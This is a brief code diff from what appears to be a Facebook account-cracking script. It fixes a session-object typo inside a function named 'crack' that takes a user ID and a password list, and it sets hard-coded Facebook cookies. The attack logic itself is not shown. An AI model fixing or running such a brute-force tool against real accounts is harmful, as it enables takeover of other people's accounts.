@@ -107,7 +107,7 @@ def crack(uid, password_list, total_count):
             
             # Create session and generate device hash
             session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
+            free_fb = session.get('https://touch.facebook.com').text
             cookies = {
             'datr': 'UsE9aaQhLbAVdkLeixtwNk0J',
             'sb': 'U8E9aQK3V0lJhxDZSnC81fBl',
